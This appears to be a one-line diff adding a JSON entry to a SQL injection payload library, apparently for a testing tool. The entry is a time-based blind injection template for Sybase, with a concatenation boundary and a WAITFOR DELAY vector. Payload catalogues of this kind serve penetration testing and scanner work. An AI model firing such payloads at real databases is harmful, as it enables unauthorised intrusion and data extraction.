@@ -1,0 +1,1 @@
+{"dbms": "sybase", "technique": "time", "boundary": {"prefix": "'||", "suffix": "-- -", "type": "concat"}, "vector": "{B} AND CASE WHEN ({T}) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END", "comment": "sybase time: single+concat"}
